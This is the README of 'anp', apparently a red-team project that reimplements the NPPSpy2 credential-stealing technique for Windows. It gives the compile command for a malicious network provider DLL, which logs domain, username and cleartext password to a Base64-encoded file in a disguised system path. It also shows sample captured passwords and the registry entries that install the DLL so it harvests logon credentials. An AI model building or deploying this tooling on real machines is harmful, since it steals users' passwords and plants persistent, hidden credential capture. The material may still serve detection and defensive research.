# anp

Network Provider tests based on [NPPSpy2](https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy2) by [gtworek](https://github.com/gtworek).

The logging structure is: 

```
{"timestamp":"TIMESTAMP","operation":"OPERATION","domain":"DOMAIN","username":"USERNAME","password":"PASSWORD"}
```

## 1. Store in a text file + Base64-encoding

The default path is "C:\Windows\Task\default.txt" but you can customize it using the macro /DFILE_PATH:

```
cl /LD /DFILE_PATH=\"C:\\\\Users\\\\ricardo\\\\Desktop\\\\custom_path.txt\" 1_textfile_base64.c crypt32.lib /link /OUT:anp.dll
```

This creates a file with a content similar to:

```
eyJ0aW1lc3RhbXAiOiIyMDI1LTA0LTE0IDEwOjI4OjM2Iiwib3BlcmF0aW9uIjoiUFdEX1VQREFURV9PTEQiLCJkb21haW4iOiJERVNLVE9QLTBONkc2OTYiLCJ1c2VybmFtZSI6InJpY2FyZG8iLCJwYXNzd29yZCI6InFxIn0=
eyJ0aW1lc3RhbXAiOiIyMDI1LTA0LTE0IDEwOjI4OjM2Iiwib3BlcmF0aW9uIjoiUFdEX1VQREFURV9ORVciLCJkb21haW4iOiJERVNLVE9QLTBONkc2OTYiLCJ1c2VybmFtZSI6InJpY2FyZG8iLCJwYXNzd29yZCI6InEifQ==
```

Which decoded is:

```
{"timestamp":"2025-04-14 10:28:36","operation":"PWD_UPDATE_OLD","domain":"DESKTOP-0N6G696","username":"ricardo","password":"qq"}
{"timestamp":"2025-04-14 10:28:36","operation":"PWD_UPDATE_NEW","domain":"DESKTOP-0N6G696","username":"ricardo","password":"q"}
```

<br>


--------------------

## Installation

```
HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order
- ProviderOrder -> Add anp
```

```
HKLM\SYSTEM\CurrentControlSet\Services\anp\NetworkProvider
- Class = [REG_DWORD]2
- ProviderPath = [REG_EXPAND_SZ]"C:\Users\ricardo\Desktop\test\test.dll"
- Name = [REG_SZ]"anp"
```
